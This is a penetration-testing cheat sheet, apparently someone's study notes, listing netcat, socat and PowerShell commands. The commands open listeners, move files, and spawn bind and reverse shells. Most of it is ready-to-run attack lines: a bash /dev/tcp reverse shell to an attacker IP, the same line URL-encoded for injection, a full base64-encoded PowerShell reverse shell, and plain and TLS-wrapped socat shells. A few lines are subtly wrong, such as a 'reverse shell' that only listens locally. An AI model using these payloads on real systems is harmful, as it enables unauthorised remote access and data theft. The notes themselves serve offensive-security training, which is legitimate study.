- N.b. many commands below are being run as sudo to make use of a port in the 0-1024 range, since root is needed to bind a listener to a port <1024. Beyond this range this is not necessary.

## NETCAT

### Flags:
-n Skip DNS resolution
-v Verbose
-l Create listener
-p <port number> To specify port number

Create Listener:
`nc -nlvp <port to listen on>`
Make Connection:
`nc -nv <IP address> <port>`
Listen For File Transfer:
`nc -nlvp <port> > incoming`
Send File:
`nc -nv <IP address> <port> < file/to/transfer`
Create Bind Shell Windows:
`nc -nlvp <port> -e cmd.exe`
Send Reverse Shell Linux:
`cat /tmp/f | /bin/sh -i 2>&1 | nc -nl 127.0.0.1 4444 > /tmp/f`

## OTHER

Simple Reverse Shell Linux:
`bash -c “bash -i >& /dev/tcp/<OurIP>/4444 0>&1”`
When you inevitably need to URL encode (https://meyerweb.com/eric/tools/dencoder/):
`bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F<OurIP>%2F4444%200%3E%261%22`
Powershell Reverse Shell (Base64 Encoded):
`pwsh`
`$Text = '$client = New-Object System.Net.Sockets.TCPClient("<attacker IP>",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'`
`$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)`
`$EncodedText =[Convert]::ToBase64String($Bytes)`
`$EncodedText`
`powershell -enc <our Base64 encoded Powershell revshell>`
Powershell Simple HTTP Server (Doesn't seem to work after testing):
https://www.powershellgallery.com/packages/Start-WebServer/1.1/Content/Start-WebServer.ps1

## SOCAT

- N.b. Whenever we execute a shell we use `/bin/bash` if our target is a Linux machine, this must be substituted for `'cmd.exe', pipes` for Windows.

Bind Shell:
Set up our listener on the target, which will deliver a shell to anyone who tries to make a connection
`sudo socat -d -d TCP4-LISTEN:443 EXEC:/bin/bash`
Now just connect with the target
`socat - TCP4:<target IP>:443`
Reverse Shell:
Create listener on our machine
`sudo socat -d -d TCP4-LISTEN:443 STDOUT`
Send shell from target machine
`socat TCP4:<attacker IP>:443 EXEC:/bin/bash`
File Transfer (Attacker to Target):
Prepare listener on source that will send the file to any machine that makes a connection
`sudo socat TCP4-LISTEN:443,fork file:<filename>`
Connect to source from target
`socat TCP4:<IP address>:443 file:<received filename>,create`
Generate .pem:
Generate certificate on target machine
`openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt`
Create .pem from keyfile and certificate
`cat shell.key shell.crt > shell.pem`
Encrypted Bind Shell:
Begin listening for attempts to connect, and deliver a shell to anyone who tries
`sudo socat OPENSSL-LISTEN:443,cert=shell.pem,verify=0,fork EXEC:/bin/bash`
Connect like so
`socat - OPENSSL:<target IP>:443,verify=0`
Encrypted Reverse Shell:
Create listener on our machine
`sudo socat -d -d OPENSSL-LISTEN:443,cert=shell.pem,verify=0,fork STDOUT`
Send shell from target machine
`socat TCP4:<attacker IP>:443, verify=0 EXEC:/bin/bash`
